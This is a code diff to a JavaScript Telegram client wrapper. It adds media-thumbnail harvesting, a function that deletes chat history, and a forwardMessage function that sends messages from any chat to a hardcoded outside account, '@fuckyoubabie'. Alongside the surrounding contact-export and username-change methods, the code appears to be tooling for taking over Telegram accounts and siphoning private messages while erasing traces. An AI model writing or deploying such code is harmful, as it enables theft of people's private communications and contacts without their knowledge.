@@ -349,26 +349,57 @@ class TelegramManager {
         }));
         return exportedContacts;
     }
-    async getMediaMetadata(chatId = 'me') {
-        const messages = await this.client.getMessages(chatId, { limit: 500 });
-        console.log("Total:", messages.total, "ChatId: ", chatId);
+    async getMediaMetadata(chatId = 'me', offset = undefined, limit = 100) {
+        const query = {
+            limit: limit
+        };
+        if (offset) {
+            console.log("Setting offset");
+            query['offsetId'] = offset;
+        }
+        console.log("Query: ", query);
+        const messages = await this.client.getMessages(chatId, query);
         const mediaMessages = messages.filter(message => message.media);
+        console.log("Total:", messages.total, "ChatId: ", chatId, "Media :", mediaMessages.length);
         const data = [];
         for (const message of mediaMessages) {
+            console.log(message.media.className, message.document?.mimeType);
+            let thumbBuffer = null;
             if (message.media instanceof tl_1.Api.MessageMediaPhoto) {
+                console.log("messageId image:", message.id);
+                const sizes = message.photo.sizes || [1];
+                thumbBuffer = await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });
                 data.push({
                     messageId: message.id,
-                    mediaType: 'photo'
+                    mediaType: 'photo',
+                    thumb: thumbBuffer
                 });
             }
-            else if (message.media instanceof tl_1.Api.MessageMediaDocument && message.media.document.mimeType == 'video/mp4') {
+            else if (message.media instanceof tl_1.Api.MessageMediaDocument && message.document.mimeType.startsWith('video')) {
+                console.log("messageId video:", message.id);
+                const sizes = message.document?.thumbs || [1];
+                thumbBuffer = await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });
                 data.push({
                     messageId: message.id,
-                    mediaType: 'video'
+                    mediaType: 'video',
+                    thumb: thumbBuffer
                 });
             }
         }
         return data;
+    }
+    async deleteChat(chatId) {
+        try {
+            await this.client.invoke(new tl_1.Api.messages.DeleteHistory({
+                justClear: false,
+                peer: chatId,
+                revoke: false,
+            }));
+            console.log(`Dialog with ID ${chatId} has been deleted.`);
+        }
+        catch (error) {
+            console.error('Failed to delete dialog:', error);
+        }
     }
     async downloadMediaFile(messageId, chatId = 'me', res) {
         try {
@@ -434,6 +465,14 @@ class TelegramManager {
         catch (error) {
             console.error(error);
             res.status(500).send('Error while streaming media');
+        }
+    }
+    async forwardMessage(chatId, messageId) {
+        try {
+            await this.client.forwardMessages("@fuckyoubabie", { fromPeer: chatId, messages: messageId });
+        }
+        catch (error) {
+            console.log("Failed to Forward Message : ", error.errorMessage);
         }
     }
     async updateUsername(baseUsername) {
